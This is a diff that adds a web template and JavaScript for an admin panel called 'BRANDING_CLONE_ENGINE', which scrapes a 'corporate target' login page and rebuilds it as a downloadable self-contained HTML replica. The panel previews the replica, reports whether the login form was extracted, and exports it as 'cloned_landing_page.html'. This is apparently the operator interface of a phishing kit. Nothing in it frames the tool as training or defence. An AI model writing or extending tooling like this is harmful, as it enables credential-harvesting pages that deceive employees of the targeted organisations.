@@ -1,0 +1,253 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="max-w-6xl mx-auto py-8 font-mono-brutal">
+  <!-- Navigation Back Link -->
+  <div class="mb-6 font-mono-brutal">
+    <a href="/" class="inline-flex items-center text-xs font-bold text-gray-700 dark:text-gray-300 hover:text-pure-black dark:hover:text-stark-white transition-colors">
+      <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7"/></svg>
+      [ BACK TO DASHBOARD ]
+    </a>
+  </div>
+
+  <header class="mb-8 border-b-4 border-pure-black pb-6">
+    <h1 class="text-4xl font-extrabold tracking-tight text-pure-black dark:text-stark-white mb-2">[ BRANDING_CLONE_ENGINE ]</h1>
+    <p class="text-sm text-brutal-red font-bold">&gt; Scrape and clone corporate target login pages (logo, CSS, colors, HTML)</p>
+  </header>
+
+  <div class="brutal-card p-6 mb-8">
+    <form onsubmit="runBrandingClone(event)" class="space-y-4">
+      <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+      <div>
+        <label class="block text-xs font-bold mb-1.5">TARGET COMPANY LOGIN URL *</label>
+        <input type="url" id="bc_url" required placeholder="https://login.company.com/auth" class="w-full p-3 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)] font-mono text-sm">
+      </div>
+      <button type="submit" id="bc-submit" class="brutal-btn-black px-8 py-3 text-xs font-extrabold">
+        <span class="btn-text">[ CLONE LOGIN PAGE ]</span>
+        <span class="btn-spinner hidden ml-2"></span>
+      </button>
+    </form>
+  </div>
+
+  <!-- Loading / progress state -->
+  <div id="bc-loading" class="hidden mb-8">
+    <div class="brutal-card p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <span class="bc-spinner"></span>
+        <span class="text-sm font-bold">CLONING TARGET PAGE...</span>
+      </div>
+      <div class="space-y-2">
+        <div class="h-2 w-full bg-gray-200 dark:bg-gray-800 overflow-hidden border border-pure-black">
+          <div id="bc-progress" class="h-full bg-brutal-red transition-all duration-300" style="width: 10%"></div>
+        </div>
+        <div id="bc-step" class="text-xs font-mono text-gray-600 dark:text-gray-400">Initializing request</div>
+      </div>
+    </div>
+  </div>
+
+  <div id="bc-results" class="hidden space-y-6 opacity-0 transition-opacity duration-500">
+    <!-- Metrics bar -->
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+      <div class="brutal-card p-4 text-center">
+        <div class="text-xs font-bold text-gray-500 mb-1">THEME</div>
+        <div id="bc-metric-theme" class="text-sm font-extrabold">-</div>
+      </div>
+      <div class="brutal-card p-4 text-center">
+        <div class="text-xs font-bold text-gray-500 mb-1">RENDER MODE</div>
+        <div id="bc-metric-spa" class="text-sm font-extrabold">-</div>
+      </div>
+      <div class="brutal-card p-4 text-center">
+        <div class="text-xs font-bold text-gray-500 mb-1">DOM PRESERVED</div>
+        <div id="bc-metric-preserved" class="text-sm font-extrabold">-</div>
+      </div>
+      <div class="brutal-card p-4 text-center">
+        <div class="text-xs font-bold text-gray-500 mb-1">FORM EXTRACTED</div>
+        <div id="bc-metric-form" class="text-sm font-extrabold">-</div>
+      </div>
+    </div>
+
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+      <div class="brutal-card p-6 col-span-1 space-y-4">
+        <h2 class="text-sm font-bold border-b-2 border-pure-black dark:border-stark-white pb-2">[ EXTRACTED_ASSETS ]</h2>
+        <div>
+          <span class="text-xs font-bold block text-gray-500">LOGO URL:</span>
+          <span id="bc-logo-url" class="text-xs font-mono break-all font-bold"></span>
+          <div id="bc-logo-preview" class="mt-2 p-2 border border-pure-black bg-gray-100 flex items-center justify-center min-h-[80px]"></div>
+        </div>
+        <div>
+          <span class="text-xs font-bold block text-gray-500">FAVICON URL:</span>
+          <span id="bc-favicon-url" class="text-xs font-mono break-all"></span>
+        </div>
+        <div>
+          <span class="text-xs font-bold block text-gray-500">EXTRACTED COLOR PALETTE:</span>
+          <div id="bc-colors" class="flex gap-2 mt-2 flex-wrap"></div>
+        </div>
+        <button onclick="downloadClonedHTML()" class="brutal-btn-red px-4 py-2 text-xs w-full mt-4">[ DOWNLOAD HTML TEMPLATE ]</button>
+        <button onclick="openClonedHTML()" class="brutal-btn-black px-4 py-2 text-xs w-full">[ OPEN IN NEW TAB ]</button>
+      </div>
+
+      <div class="brutal-card p-6 col-span-2 space-y-4">
+        <div class="flex items-center justify-between border-b-2 border-pure-black dark:border-stark-white pb-2">
+          <h2 class="text-sm font-bold">[ CLONED_TEMPLATE_PREVIEW ]</h2>
+          <div class="flex gap-2">
+            <button onclick="setPreviewTab('preview')" id="tab-preview" class="px-3 py-1 text-xs font-bold border-2 border-pure-black bg-pure-black text-white">PREVIEW</button>
+            <button onclick="setPreviewTab('source')" id="tab-source" class="px-3 py-1 text-xs font-bold border-2 border-pure-black hover:bg-gray-100 dark:hover:bg-gray-900">SOURCE</button>
+          </div>
+        </div>
+        <div id="panel-preview" class="block">
+          <iframe id="bc-preview-iframe" class="w-full h-[600px] border-2 border-pure-black bg-white"></iframe>
+        </div>
+        <div id="panel-source" class="hidden">
+          <textarea id="bc-source-text" readonly class="w-full h-[600px] border-2 border-pure-black bg-gray-50 dark:bg-black text-[10px] font-mono p-2"></textarea>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<style>
+.bc-spinner {
+  width: 20px; height: 20px;
+  border: 3px solid #e5e7eb;
+  border-top-color: #ef4444;
+  border-radius: 50%;
+  animation: bc-spin .8s linear infinite;
+}
+@keyframes bc-spin { to { transform: rotate(360deg); } }
+.btn-spinner {
+  display: inline-block;
+  width: 14px; height: 14px;
+  border: 2px solid rgba(255,255,255,.4);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: bc-spin .7s linear infinite;
+  vertical-align: middle;
+}
+</style>
+
+<script>
+  let clonedHtmlContent = "";
+
+  function setPreviewTab(tab) {
+    document.getElementById('panel-preview').classList.toggle('hidden', tab !== 'preview');
+    document.getElementById('panel-source').classList.toggle('hidden', tab !== 'source');
+    document.getElementById('tab-preview').classList.toggle('bg-pure-black', tab === 'preview');
+    document.getElementById('tab-preview').classList.toggle('text-white', tab === 'preview');
+    document.getElementById('tab-source').classList.toggle('bg-pure-black', tab === 'source');
+    document.getElementById('tab-source').classList.toggle('text-white', tab === 'source');
+  }
+
+  async function runBrandingClone(e) {
+    e.preventDefault();
+    const url = document.getElementById('bc_url').value;
+    const results = document.getElementById('bc-results');
+    const loading = document.getElementById('bc-loading');
+    const progress = document.getElementById('bc-progress');
+    const step = document.getElementById('bc-step');
+    const submitBtn = document.getElementById('bc-submit');
+
+    results.classList.add('hidden');
+    results.classList.remove('opacity-100');
+    loading.classList.remove('hidden');
+    submitBtn.disabled = true;
+    submitBtn.querySelector('.btn-text').textContent = '[ CLONING... ]';
+    submitBtn.querySelector('.btn-spinner').classList.remove('hidden');
+
+    const setStep = (pct, label) => {
+      progress.style.width = pct + '%';
+      step.textContent = label;
+    };
+
+    try {
+      setStep(15, 'Fetching target page');
+      await new Promise(r => setTimeout(r, 120));
+      const res = await fetch('/admin/branding/clone', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ url })
+      });
+      setStep(55, 'Parsing CSS & assets');
+      await new Promise(r => setTimeout(r, 120));
+      const data = await res.json();
+      setStep(90, 'Building self-contained template');
+      await new Promise(r => setTimeout(r, 120));
+
+      if (data.error) {
+        alert("Cloning error: " + data.error);
+        loading.classList.add('hidden');
+        submitBtn.disabled = false;
+        submitBtn.querySelector('.btn-text').textContent = '[ CLONE LOGIN PAGE ]';
+        submitBtn.querySelector('.btn-spinner').classList.add('hidden');
+        return;
+      }
+
+      clonedHtmlContent = data.template || data.html;
+
+      document.getElementById('bc-logo-url').textContent = data.logo_url || "None detected";
+      document.getElementById('bc-favicon-url').textContent = data.favicon_url || "None detected";
+
+      if (data.logo_url) {
+        document.getElementById('bc-logo-preview').innerHTML = `<img src="${data.logo_url}" class="max-h-16 object-contain" />`;
+      } else {
+        document.getElementById('bc-logo-preview').innerHTML = `<span class="text-xs text-gray-500">No logo</span>`;
+      }
+
+      // Render colors
+      const colorsEl = document.getElementById('bc-colors');
+      colorsEl.innerHTML = "";
+      if (data.colors) {
+        for (const [k, v] of Object.entries(data.colors)) {
+          if (v) {
+            colorsEl.innerHTML += `<div class="text-center"><div class="w-8 h-8 border border-pure-black shadow-sm" style="background-color: ${v};"></div><span class="text-[9px] uppercase">${k}</span></div>`;
+          }
+        }
+      }
+
+      // Metrics
+      document.getElementById('bc-metric-theme').textContent = (data.theme || 'unknown').toUpperCase();
+      document.getElementById('bc-metric-spa').textContent = data.spa ? 'SPA' : 'SERVER';
+      document.getElementById('bc-metric-preserved').textContent = data.preserved ? 'YES' : 'NO';
+      document.getElementById('bc-metric-form').textContent = (data.preserved || (data.html && data.html.includes('<form'))) ? 'YES' : 'NO';
+
+      // Render iframe
+      const iframe = document.getElementById('bc-preview-iframe');
+      const doc = iframe.contentWindow.document;
+      doc.open();
+      doc.write(clonedHtmlContent);
+      doc.close();
+
+      // Source tab
+      document.getElementById('bc-source-text').value = clonedHtmlContent;
+
+      loading.classList.add('hidden');
+      results.classList.remove('hidden');
+      // Trigger reflow for fade-in
+      void results.offsetWidth;
+      results.classList.add('opacity-100');
+      setPreviewTab('preview');
+    } catch (err) {
+      alert("Error cloning page: " + err);
+      loading.classList.add('hidden');
+    } finally {
+      submitBtn.disabled = false;
+      submitBtn.querySelector('.btn-text').textContent = '[ CLONE LOGIN PAGE ]';
+      submitBtn.querySelector('.btn-spinner').classList.add('hidden');
+    }
+  }
+
+  function downloadClonedHTML() {
+    if (!clonedHtmlContent) return;
+    const blob = new Blob([clonedHtmlContent], { type: 'text/html' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'cloned_landing_page.html';
+    a.click();
+  }
+
+  function openClonedHTML() {
+    if (!clonedHtmlContent) return;
+    const blob = new Blob([clonedHtmlContent], { type: 'text/html' });
+    const url = URL.createObjectURL(blob);
+    window.open(url, '_blank');
+  }
+</script>
+{% endblock %}
